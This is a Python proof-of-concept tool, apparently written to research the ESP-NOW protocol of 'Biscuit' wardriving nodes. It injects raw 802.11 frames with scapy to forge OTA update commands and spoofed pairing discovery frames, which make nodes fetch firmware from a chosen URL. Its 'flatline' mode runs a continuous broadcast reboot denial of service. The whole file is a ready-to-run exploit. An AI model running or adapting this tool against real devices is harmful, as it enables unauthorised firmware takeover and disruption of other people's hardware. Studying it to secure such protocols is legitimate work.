#!/usr/bin/env python3
"""Biscuit Baker / Biscuit Flatline — Python port (own-hardware ESP-NOW OTA PoC).

                   ███╗   ██╗██████╗ ██╗    ██╗██████╗
                   ████╗  ██║╚════██╗██║    ██║██╔══██╗
                   ██╔██╗ ██║ █████╔╝██║ █╗ ██║██████╔╝
                   ██║╚██╗██║ ╚═══██╗██║███╗██║██╔══██╗
                   ██║ ╚████║██████╔╝╚███╔███╔╝██████╔╝
                   ╚═╝  ╚═══╝╚═════╝  ╚══╝╚══╝ ╚═════╝

Requires: root, a monitor-mode adapter on the Biscuit ESP-NOW channel (6), scapy.

    pip install scapy
    sudo ip link set wlan1 down && sudo iw dev wlan1 set type monitor && sudo ip link set wlan1 up

Modes:
    overcooked  one-shot broadcast OTA burst (the classic injection)
    flash       unicast OTA to specific node MAC(s)
    flatline    continuous ~5 s broadcast reboot-DoS until Ctrl-C
"""

import argparse
import os
import struct
import sys
import time

try:
    from scapy.all import RadioTap, Dot11, sendp
except ImportError:
    sys.exit("scapy not installed — `pip install scapy`")

BCAST = "ff:ff:ff:ff:ff:ff"
ESPRESSIF_OUI = b"\x18\xfe\x34"
ENOW_MIN = 212         
ENOW_MAX = 250

OTA_LATCH = 0.300
DISCOVER_SETTLE = 0.600
FLATLINE_PERIOD = 5.0

DEFAULT_SSID = "WardriverMgr"
DEFAULT_PASS = "wardrive123"
DEFAULT_URL = "https://firmware.biscuitshop.us/BiscuitNode/Prod/catcher.bin"


def build_ota_frame(ssid: str, passwd: str, url: str) -> bytes:
    """ENOW OTA_COMMAND (type 0x06). Layout: magic[4] type[1] counter[4 LE]
    len[2 LE] body[]. body = "ssid,pass,url\\0". Padded to >= 212, <= 250."""
    text = f"{ssid},{passwd},{url}".encode()
    if 11 + len(text) + 1 > ENOW_MAX:
        raise ValueError("ssid,pass,url too long for a single ENOW frame")
    frame = bytearray(b"ENOW")
    frame.append(0x06)
    frame += struct.pack("<I", 0)          
    frame += struct.pack("<H", len(text))  
    frame += text + b"\x00"
    if len(frame) < ENOW_MIN:
        frame += b"\x00" * (ENOW_MIN - len(frame))
    return bytes(frame)


def build_discovery_frame() -> bytes:
    """ENOW DISCOVERY (type 0x02) — poses as Core so the node pairs
    (SEARCHING->PAIRED) and fires the latched OTA. Body-less, padded to 212."""
    frame = bytearray(b"ENOW")
    frame.append(0x02)
    frame += b"\x00" * (ENOW_MIN - len(frame)) 
    return bytes(frame)


def espnow_action(dst: str, src: str, payload: bytes) -> bytes:
    """Wrap an ENOW payload in the ESP-NOW vendor-specific Action frame body:
    category 0x7f + Espressif OUI + 4 random-ish bytes + element(0xdd, OUI,
    type 0x04, version 0x01, payload)."""
    element = b"\xdd" + bytes([5 + len(payload)]) + ESPRESSIF_OUI + b"\x04\x01" + payload
    body = b"\x7f" + ESPRESSIF_OUI + b"\x00\x00\x00\x00" + element
    dot11 = Dot11(type=0, subtype=13, addr1=dst, addr2=src, addr3=BCAST)
    return RadioTap() / dot11 / body


def send(iface: str, dst: str, src: str, payload: bytes):
    sendp(espnow_action(dst, src, payload), iface=iface, verbose=False)


def run_one(iface: str, mac: str, src: str, ssid: str, passwd: str, url: str):
    """OTA first (node latches it), then a discovery to fire it, then a second
    discovery to cover a miss — the operator-verified order from runOne()."""
    print(f"  [ota]      -> {mac}")
    send(iface, mac, src, build_ota_frame(ssid, passwd, url))
    time.sleep(OTA_LATCH)
    print(f"  [discover] -> {mac}")
    send(iface, mac, src, build_discovery_frame())
    time.sleep(DISCOVER_SETTLE)
    print(f"  [sanity]   -> {mac}")
    send(iface, mac, src, build_discovery_frame())


def set_channel(iface: str, ch: int):
    if os.system(f"iw dev {iface} set channel {ch} >/dev/null 2>&1") != 0:
        print(f"! could not set {iface} to channel {ch} (is it in monitor mode?)",
              file=sys.stderr)


def cmd_overcooked(a):
    set_channel(a.iface, a.channel)
    print(f"[overcooked] broadcast OTA burst -> {a.ssid} / {a.url}")
    run_one(a.iface, BCAST, a.src, a.ssid, a.password, a.url)
    print("done")


def cmd_flash(a):
    set_channel(a.iface, a.channel)
    if a.enc:
        print("! encrypted unicast is not reproducible via raw injection — "
              "sending plaintext (see module docstring)", file=sys.stderr)
    for mac in a.macs:
        print(f"[flash] {mac}")
        run_one(a.iface, mac, a.src, a.ssid, a.password, a.url)
    print("done")


def cmd_flatline(a):
    set_channel(a.iface, a.channel)
    print("[flatline] continuous broadcast reboot-DoS — Ctrl-C to stop")
    n = 0
    try:
        while True:
            run_one(a.iface, BCAST, a.src, "flatline", "", "http://192.168.4.1/x")
            n += 1
            print(f"  burst {n}")
            time.sleep(FLATLINE_PERIOD)
    except KeyboardInterrupt:
        print(f"\nstopped after {n} bursts")


def main():
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--iface", required=True, help="monitor-mode interface (e.g. wlan1)")
    p.add_argument("--src", default="de:ad:be:ef:00:01",
                   help="source/Core MAC the node adopts on pairing")
    p.add_argument("--channel", type=int, default=6, help="ESP-NOW channel (default 6)")
    sub = p.add_subparsers(dest="cmd", required=True)

    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--ssid", default=DEFAULT_SSID)
    common.add_argument("--password", default=DEFAULT_PASS)
    common.add_argument("--url", default=DEFAULT_URL)

    o = sub.add_parser("overcooked", parents=[common], help="one-shot broadcast OTA")
    o.set_defaults(func=cmd_overcooked)

    f = sub.add_parser("flash", parents=[common], help="unicast OTA to node MAC(s)")
    f.add_argument("macs", nargs="+", help="target node MAC(s)")
    f.add_argument("--enc", action="store_true", help="(not reproducible; warns)")
    f.set_defaults(func=cmd_flash)

    fl = sub.add_parser("flatline", help="continuous reboot-DoS")
    fl.set_defaults(func=cmd_flatline)

    a = p.parse_args()
    if os.geteuid() != 0:
        sys.exit("must run as root (raw 802.11 injection)")
    a.func(a)


if __name__ == "__main__":
    main()
